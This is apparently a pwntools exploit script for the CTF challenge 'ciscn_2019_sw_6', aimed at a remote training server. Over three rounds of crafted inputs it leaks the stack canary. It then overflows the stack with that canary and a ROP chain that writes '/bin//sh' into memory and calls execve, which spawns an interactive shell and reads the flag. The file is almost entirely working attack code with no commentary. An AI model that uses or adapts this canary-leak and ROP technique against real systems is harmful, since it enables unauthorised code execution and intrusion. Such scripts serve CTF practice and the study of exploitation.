from pwn import *
context.log_level = "debug"
context.arch = "amd64"
elf = ELF("ciscn_2019_sw_6")
sh = 0
lib = 0
canary_list = []
def getRop():
	rop = []
	rop.append(0x080704fa) # pop edx ; ret
	rop.append(0x080ec060) # @ .data
	rop.append(0x080b9856) # pop eax ; ret
	rop.append(0x6E69622F)
	rop.append(0x08055efb) # mov dword ptr [edx], eax ; ret
	rop.append(0x080704fa) # pop edx ; ret
	rop.append(0x080ec064) # @ .data + 4
	rop.append(0x080b9856) # pop eax ; ret
	rop.append(0x68732F2F)
	rop.append(0x08055efb) # mov dword ptr [edx], eax ; ret
	rop.append(0x080704fa) # pop edx ; ret
	rop.append(0x080ec068) # @ .data + 8
	rop.append(0x0804a773) # xor eax, eax ; ret
	rop.append(0x08055efb) # mov dword ptr [edx], eax ; ret
	rop.append(0x08049021) # pop ebx ; ret
	rop.append(0x080ec060) # @ .data
	rop.append(0x08070521) # pop ecx ; pop ebx ; ret
	rop.append(0x080ec068) # @ .data + 8
	rop.append(0x080ec060) # padding without overwrite ebx
	rop.append(0x080704fa) # pop edx ; ret
	rop.append(0x080ec068) # @ .data + 8
	rop.append(0x0804a773) # xor eax, eax ; ret
	rop.append(0x08096a87) # add eax,2 ; ret
	rop.append(0x08096aa0) # add eax,3 ; ret
	rop.append(0x08096aa0) # add eax,3 ; ret
	rop.append(0x08096aa0) # add eax,3 ; ret
	rop.append(0x0806e173) # int 0x80
	return rop
def pwn(ip,port,debug):
	global sh
	global lib
	if(debug == 1):
		sh = process("./ciscn_2019_sw_6")
	else:
		sh = remote(ip,port)
	sh.recvuntil("Name:")
	sh.sendline("fuckyou")
	#leak 1
	sh.recvuntil("Count?(Input 0 to stop)")
	sh.sendline("301")
	num = 0x10000000
	for i in range(0,299):
		sh.recvuntil(": ")
		sh.sendline(str(num))
		canary_list.append(num)
		num = num + 0xCD7C24
	sh.recvuntil(": ")
	sh.sendline(str(0x0))
	sh.recvuntil("The result is ")
	magic1 = int(sh.recvuntil("\n",False),10) - 299
	canary_min_1 = (299 - magic1 - 1) * 0xCD7C24 + 0x10000000
	canary_max_1 = (299 - magic1) * 0xCD7C24 + 0x10000000
	sh.recvuntil("Continue?(y/n)")
	sh.sendline("y")
	#leak 2
	delta2 = (canary_max_1 - canary_min_1) / 299
	num = canary_min_1
	sh.recvuntil("Count?(Input 0 to stop)")
	sh.sendline("301")	
	for i in range(0,299):
		sh.recvuntil(": ")
		sh.sendline(str(num))
		num = delta2 + num
	sh.recvuntil(": ")
	sh.sendline(str(0x0))
	sh.recvuntil("The result is ")
	magic2 = int(sh.recvuntil("\n",False),10) - 299
	canary_min_2 = (299 - magic2 - 1) * delta2 + canary_min_1
	canary_max_2 = (299 - magic2) * delta2 + canary_min_1
	sh.recvuntil("Continue?(y/n)")
	sh.sendline("y")	
	#leak 3	
	delta3 = (canary_max_2 - canary_min_2) / 299
	num = canary_min_2
	sh.recvuntil("Count?(Input 0 to stop)")
	sh.sendline("301")
	for i in range(0,299):
		sh.recvuntil(": ")
		sh.sendline(str(num))
		num = delta3 + num
	sh.recvuntil(": ")
	sh.sendline(str(0x0))
	sh.recvuntil("The result is ")
	magic3 = int(sh.recvuntil("\n",False),10) - 299
	canary_min_3 = (299 - magic3 - 1) * delta3 + canary_min_2
	canary_max_3 = (299 - magic3) * delta3 + canary_min_2
	sh.recvuntil("Continue?(y/n)")
	sh.sendline("y")
	canary = (canary_max_3 >> 8) << 8
	sh.recvuntil("Count?(Input 0 to stop)")
	sh.sendline("301")
	ROP = getRop()
	for i in range(0,300):
		sh.recvuntil(": ")
		print i
		sh.sendline(str(0xdeadbeef))
	sh.recvuntil(": ")
	sh.sendline(str(canary))
	sh.recvuntil(": ")
	sh.sendline(str(0xdeadbeef))
	for i in ROP:
		sh.recvuntil(": ")
		sh.sendline(str(i))
		print i
	sh.recvuntil(": ")
	sh.sendline("0")
	sh.recv()
	sh.sendline("cat flag")
	print sh.recv()
	sh.interactive()
if __name__ == "__main__":
	pwn("node3.buuoj.cn",27903,0)